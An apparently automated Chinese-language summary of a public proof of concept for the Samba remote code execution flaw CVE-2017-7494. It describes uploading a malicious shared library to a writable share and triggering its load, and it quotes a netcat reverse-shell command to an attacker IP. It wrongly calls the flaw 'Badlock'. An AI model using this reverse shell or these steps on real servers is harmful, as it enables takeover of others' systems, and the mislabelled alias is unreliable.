## CVE-2017-7494-Samba-远程代码执行

**漏洞编号:** CVE-2017-7494

**漏洞类型:** 远程代码执行

**影响应用:** Samba

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** since 3.5.0 and before 4.6.4, 4.5.10 and 4.4.14

**利用条件:** 需要可写共享目录和对Samba服务器的网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2017-7494，又名"Badlock"，是一个存在于Samba中的远程代码执行漏洞。漏洞原理是攻击者可以上传一个恶意的共享库（.so文件）到可写的共享目录，然后通过SMB协议的一个特性，让Samba服务器加载并执行该恶意库。 

**漏洞利用方式：**

1.  **编译恶意共享库：** 使用提供的`samba_init.c`编译生成`libsamba.so`。这个`.so`文件包含攻击者想要执行的恶意代码，例如反弹shell。
2.  **上传恶意共享库：** 使用`smbclient`命令将`libsamba.so`上传到Samba服务器上具有写入权限的共享目录中。 `is_known_pipename.c`文件中的`upload_module`函数执行此步骤。
3.  **触发服务器加载恶意共享库：** 通过构造一个特殊的SMB请求，指定要加载的共享库路径（PIPE），诱使Samba服务器加载并执行`libsamba.so`。 `is_known_pipename.c`文件中的`load_module` 函数，以及`main`函数中的`char *pStr = "\\PIPE\\/home/chenzy/share/libsamba.so";`和`load_module("192.168.0.152/IPC$", "", "", pStr);`执行此步骤。
4.  **代码执行：** 当Samba服务器加载`libsamba.so`时，`samba_init_module()`函数被执行，从而触发了反弹shell操作。`samba_init.c`中的`system("nc -e /bin/bash 192.168.0.172 47288");`完成了反弹shell的操作。

**有效性：**

根据提供的漏洞信息和利用代码，此POC是有效的。漏洞库信息表明该漏洞是可利用的，并且存在公开的漏洞利用代码。提供的代码演示了如何利用该漏洞实现远程代码执行。

**投毒风险：**

经过对提供的POC代码的分析，没有发现明显的投毒代码。该代码的主要功能是利用漏洞执行指定的命令（例如，反弹shell）。需要注意的是，`samba_init.c` 中执行的命令`nc -e /bin/bash 192.168.0.172 47288` 本身具有潜在的风险，但这不是投毒，而是漏洞利用的一部分。这段代码在目标机器上反弹了一个shell给攻击者的192.168.0.172的47288端口。因此，投毒风险为0%。

**项目地址:** [incredible1yu/CVE-2017-7494](https://github.com/incredible1yu/CVE-2017-7494)

**漏洞详情:** [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)